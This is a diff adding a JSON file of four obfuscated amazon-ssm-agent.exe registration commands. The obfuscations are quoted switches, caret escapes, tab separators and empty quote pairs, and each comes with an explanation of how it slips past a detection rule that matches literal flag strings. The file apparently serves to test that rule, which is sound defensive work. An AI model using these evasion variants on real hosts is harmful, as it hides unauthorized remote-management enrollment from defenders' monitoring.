@@ -1,0 +1,18 @@
+[
+  {
+    "output": "amazon-ssm-agent.exe \"-register\" \"-code\" \"activation-code\" \"-id\" \"activation-id\" \"-region\" \"us-east-1\"",
+    "explanation": "Insertion technique: Enclosed individual operation switches inside double quotes. The Windows argument subsystem and application parser clean and strip these quotes prior to handing them over to the application's internal option router, but this modification breaks the contiguous character string evaluation for '-register ', '-code ', '-id ', and '-region ' by interposing a quote before the trailing space."
+  },
+  {
+    "output": "cmd.exe /c amazon-ssm-agent.exe -reg^ister -c^ode \"activation-code\" -^id \"activation-id\" -reg^ion \"us-east-1\"",
+    "explanation": "Insertion technique: Injected caret (^) escape characters into the middle of each required registration parameter when invoked via the Windows Command Processor (cmd.exe). The shell handles and filters out the escape marks before starting the target process, keeping execution functionality equivalent while the raw logged string sequence evades the exact literal filters."
+  },
+  {
+    "output": "amazon-ssm-agent.exe -register\t-code\t\"activation-code\"\t-id\t\"activation-id\"\t-region\t\"us-east-1\"",
+    "explanation": "Insertion technique: Replaced the standard whitespace characters separating the command flags with horizontal tab characters (\\t). The native parameter parsing pipeline treats tabs as standard parameter breaks, ensuring identical onboarding registration while successfully defeating the rule's strict requirement for literal trailing spaces."
+  },
+  {
+    "output": "amazon-ssm-agent.exe -reg\"\"ister -co\"\"de \"activation-code\" -i\"\"d \"activation-id\" -reg\"\"ion \"us-east-1\"",
+    "explanation": "Insertion technique: Interleaved empty double-quote sets ('\"\"') directly inside the parameter flag strings. The environment runtime natively consolidates and standardizes these broken string pieces when populating the argument vector array, whereas simple pattern scanners fail to detect the interrupted keyword sequence."
+  }
+]
